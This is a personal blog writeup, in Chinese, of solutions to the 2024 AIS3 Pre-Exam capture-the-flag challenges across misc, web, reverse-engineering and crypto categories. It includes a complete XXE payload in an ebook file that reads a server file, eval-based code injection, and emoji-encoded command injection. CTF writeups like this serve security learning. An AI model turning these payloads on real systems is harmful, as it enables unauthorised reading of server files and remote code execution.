---
layout: post
title: 2024 AIS3 Pre-Exam Writeup
description: 再戰 AIS3 Pre-Exam
date: 2024-07-01 00:00:00 +0800
categories: Writeup CTF
tags: AIS3
published: true
---

## misc
### Welcome
The FLAG is AIS3{Welc0me_to_AIS3_PreExam_2o24!}\
點點點

### Emoji Console
一開始用 cat * 拿到原始碼
並發現訊息
```
cat: flag: Is a directory
cat: templates: Is a directory
```
得知有 flag 資料夾
但 emoji 沒有 /，這時想使用 cd flag 後 cat * 的方式
使用兩個 emoji 來隔開指令
```
💿 🚩 😜😑 🐱 ⭐
```
這時輸出了檔案內容，很好心的放上了檔名註解
```
#flag-printer.py

print(open('/flag','r').read())
```
使用python來執行
```
💿 🚩 😓😑 🐍 ⭐
```

### Three Dimensional Secret
wireshark 開起來，用 tcp stream 看資料
可以找到程式碼，問 gpt 後發現是 G-code 程式碼
拉遠線上編譯器的視角就可以看到 flag 被畫出來

### Quantum Nim Heist
一個文字介面遊戲，規則是有一堆石頭可以拿，規則是一人一回合
一次拿一些石頭，最少拿一顆，拿到最後一顆石頭的人就贏得遊戲
根據程式碼可以找到贏得遊戲可以拿 flag

程式會生成一個電腦必贏的局面，一開始想透過破解 hash 來修改存檔，不過看 hint 後就把注意力放在遊戲邏輯上，發現電腦移動的程式碼是寫在選項的迴圈外，這表示就算沒有選擇，電腦也一定會被觸發一回合，這樣最後玩家就可以透過跳過自己的回合，來讓局面必勝

### Hash Guesser
每次使用者上傳圖片
網頁會隨機生成一個 16*16 的圖片
接著拿去做比對
```
ImageChops.difference(img1, img2).getbbox() == None
```

google 發現有人在討論不同圖片，但比對是相同的案例
https://github.com/python-pillow/Pillow/issues/2982

生成一個 1*1 白色的圖片，就可以了
```python=
image = Image.new("L", (1, 1), 0)
image.save("payload_image.png")
```

## web
### Evil Calculator
eval輸入的字串，轉換成可執行的程式碼後並執行
```
expression = data['expression'].replace(" ","").replace("_","")
    try:
        result = eval(expression)

```

把請求拿到 repeater 做
![By4cwHmEC](https://hackmd.io/_uploads/rJ9UC_jBA.png)


原始碼中可以發現 flag 在根目錄，用open開起來讀取
![S1hgnH7NR](https://hackmd.io/_uploads/SJWD0OiHC.png)



### Ebook Parser
這題讓我想到了 pdf 之前有 xss 的問題
所以聯想到了可能解析電子書會有類似的漏洞

可以看到程式碼中 import 了 ebookmeta
並找到程式碼指定版本 ebookmeta==1.2.8
去 google 相關問題

最後在
https://github.com/dnkorpushov/ebookmeta/issues/16
找到回報問題
ebookmeta version < 1.2.8 
lxml version < 4.9.1
ebookmeta.get_metadata 存在 xxe

稍微改一下 payload ENTITY xxe SYSTEM 的部分就可以了
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:/flag" >]>
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
<description>
    <title-info>
        <genre>antique</genre>
        <author><first-name></first-name><last-name>&xxe;</last-name></author>
        <book-title>&xxe;</book-title>
        <lang>&xxe;</lang>
    </title-info>
    <document-info>
        <author><first-name></first-name><last-name>Unknown</last-name></author>
        <program-used>calibre 6.13.0</program-used>
        <date>26.5.2024</date>
        <id>eb5cbf82-22b5-4331-8009-551a95342ea0</id>
        <version>1.0</version>
    </document-info>
    <publish-info>
    </publish-info>
</description>
<body>
<section>
<p>&lt;123&gt;</p>
<p>12345</p>
<p>&lt;/123&gt;</p>
</section>
</body>

</FictionBook>
```

## rev
### The Long Print
ghidra 打開後可以發現超長 sleep
![SJiJvSmEA](https://hackmd.io/_uploads/ryqvAdjS0.png)

```
gdb 開起來
r 先執行一次
disas main 看地址，配合 ghidra 去找到 sleep 呼叫的組合語言
b *0x555555555230

下腳本改 PC ，讓他每次都跳過
commands
set $rip = 0x555555555235
continue
end
```

這時發現沒印完，直接把for迴圈判斷式改成一直跑

```
b *0x0000555555555275

# 設置 ZF 位為 1，這樣 `jle` 的條件就滿足了
commands
set $eflags |= (1 << 6)  
continue
end
```

![BkQnUr7V0](https://hackmd.io/_uploads/BJzdRuirR.png)

最後複製到 vscode 把空行和空格全部取代掉，就可以複製flag了

## crypto
### babyRSA
題目給了 public key 和 n
所以我們可以隨意加密任意訊息
並且我們知道 flag 是有固定格式的

懶得做成對印表，直接暴力寫一個迴圈去跑加密後的訊息
每次都去算 ascii 加密後的內容比對，這樣就可以推出所有訊息

```python=
encrypted = 太長了就不貼上了ㄌ
def encrypt(plaintext):
    key = 64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733
    n = 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649
    cipher = [pow(ord(char), key, n) for char in plaintext]
    return cipher

aaa=''
for j in encrypted:
    # 印出所有 ASCII 字元及其對應的編碼
    for i in range(128):
        if j == encrypt(chr(i))[0]:
            aaa += chr(i)
            print(aaa)
```